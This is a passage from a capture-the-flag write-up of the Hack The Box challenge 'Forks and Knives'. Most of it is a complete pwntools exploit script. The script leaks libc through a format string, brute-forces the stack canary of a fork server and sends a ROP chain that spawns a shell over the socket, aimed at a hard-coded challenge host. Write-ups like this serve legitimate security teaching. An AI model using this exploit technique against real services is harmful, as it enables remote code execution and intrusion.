[*] Loaded 219 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
$ echo "pwned"
pwned
```

## Final Exploit Script

```python title=ex.py
#!/usr/bin/env python3
from pwn import *
import time
import re

context.update(arch="amd64", os="linux", log_level="info")

BIN_PATH = "./server_patched"
LIBC_PATH = "./libc.so.6"

LOCAL_HOST = "127.0.0.1"
LOCAL_PORT = 1337

REMOTE_HOST = args.HOST or "154.57.164.63"
REMOTE_PORT = int(args.PORT or 31455)

elf = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

server = None

def start_local_server():
    global server

    if args.REMOTE:
        return

    if server is None:
        server = process(BIN_PATH)
        time.sleep(0.25)

def get_target():
    if args.REMOTE:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        start_local_server()
        p = remote(LOCAL_HOST, LOCAL_PORT)

    # this unlocks the manager-only reservation viewer/clearer.
    p.sendafter(b"=> ", b"A" * 16)
    return p

# menu wrappers
def choice(p, idx):    p.sendlineafter(b"=> ", str(idx).encode())
def clear_reservations(p):    choice(p, 6)
def show_reservations(p):    choice(p, 5); return p.recvuntil(b"+--------------------+", drop=True)

def reserve_table(p, amount=b"1234"):
    assert len(amount) <= 4
    choice(p, 1)

    # reserve_table() reads exactly up to 4 bytes.
    # Send exactly 4 so there is no newline left in the socket buffer.
    p.sendafter(b"=> ", amount.ljust(4, b"\x00"))

def leak_libc(fmt):
    assert len(fmt) <= 4

    with context.local(log_level="error"):
        p = get_target()
        clear_reservations(p)

        # The reservation file is our printf output sink:
        # user amount -> "Table for %2$p\n" -> fprintf(stream, fmt) -> reservations.txt
        # manager bypass -> show_reservations() -> leak over socket
        reserve_table(p, fmt)

        data = show_reservations(p)
        p.close()

        if isinstance(data, str):
            data = data.encode()

        leak = int(re.search(rb"0x[0-9a-fA-F]+", data).group(0), 16)
        return leak

def try_canary_prefix(prefix):
    timeout = 1.0 if args.REMOTE else 0.05
    with context.local(log_level="error"):
        p = None
        try:
            p = get_target()

            reserve_table(p, b"1234")
            choice(p, 2)

            p.sendafter(b"=> ", b"A" * 256)
            p.sendafter(b"=> ", b"y\x00")

            payload = b"B" * 8 + prefix
            p.sendafter(b"=> ", payload)

            data = p.recvuntil(b"=> ", timeout=timeout)

            return bool(data and b"+--------------------+" in data)

        except EOFError:
            return False

        finally:
            if p is not None:
                try:
                    p.close()
                except Exception:
                    pass

def brute_canary():
    # canary low byte is known NUL; fork-server children reuse the same parent TLS canary.
    canary = b"\x00"

    with log.progress("bruteforcing canary") as prog:
        # wrong guesses kill only the child, so reconnect and brute force bytes 1..7.
        for idx in range(1, 8):
            for guess in range(256):
                attempt = canary + bytes([guess])
                shown = u64(attempt.ljust(8, b"\x00"))

                prog.status(f"byte {idx}/7 trying {guess:#04x} | {hex(shown)}")

                if try_canary_prefix(attempt):
                    canary = attempt
                    break
            else:
                log.failure(f"failed at byte {idx}, partial={canary.hex()}")
                raise SystemExit

        canary = u64(canary)
        prog.success(f"canary -> {hex(canary)}")

    return canary

def exploit(canary, libc_base):
    p = get_target()

    reserve_table(p, b"EXPL")

    choice(p, 2)

    libc.address = libc_base
    rop = ROP(libc)

    sockfd = 4  # our socket fd

    # system("/bin/sh") needs dup2 first so the shell talks over the accepted socket fd.
    rop.call(libc.sym["dup2"], [sockfd, 0])
    rop.call(libc.sym["dup2"], [sockfd, 1])
    rop.call(libc.sym["dup2"], [sockfd, 2])

    rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])

    # log.info(rop.dump())

    # second read starts at order+0x100:
    #   +0x00: finish final 8 bytes of order[]
    #   +0x08: canary
    #   +0x10: saved rbp
    #   +0x18: saved rip / rop chain
    payload = flat(
        b"B" * 8,
        p64(canary),
        b"C" * 8,
        rop.chain(),
    )

    # first read fills order[0:256], second read consumes y/n,
    # third read begins at order + 256, i.e. 8 bytes before canary
    p.sendafter(b"=> ", b"A" * 256 + b"y\x00" + payload)
    p.recvuntil(b'You order has been placed!\n')
    p.interactive()

def main():

    libc_leak = leak_libc(b"%2$p")
    log.success(f"libc leak -> {hex(libc_leak)}")

    libc_base = libc_leak - 0x11491b
    log.success(f'libc base -> {hex(libc_base)}')

    canary = brute_canary()

    exploit(canary, libc_base)

if __name__ == "__main__":
    main()
```

## Lessons Learned

- Using [pwninit](#^pwninit) to patch the binary into using the supplied `libc.so.6`
- Stack canaries can be brute forced on servers or processes that use `fork()`
- Globals can be affected by OOB attacks

## References

- [Hack The Box - Forks and Knives](https://app.hackthebox.com/challenges/Forks%2520and%2520Knives)
- [Linux manual page - `fork(2)`](https://man7.org/linux/man-pages/man2/fork.2.html)
- [Linux manual page - `read(2)`](https://man7.org/linux/man-pages/man2/read.2.html)
- [Linux manual page - `dup(2)` / `dup2(2)`](https://man7.org/linux/man-pages/man2/dup.2.html) ^dup2
- [Linux manual page - `printf(3)` / `fprintf(3)`](https://man7.org/linux/man-pages/man3/printf.3.html)
- [GCC documentation - Stack protector instrumentation](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)
- [pwntools documentation - ROP](https://docs.pwntools.com/en/stable/rop/rop.html)
- [pwntools documentation - Tubes](https://docs.pwntools.com/en/stable/tubes.html)
- [Ghidra](https://ghidra-sre.org/) ^ghidra
- [GEF](https://hugsy.github.io/gef/) ^GEF
- [pwninit](https://github.com/io12/pwninit) ^pwninit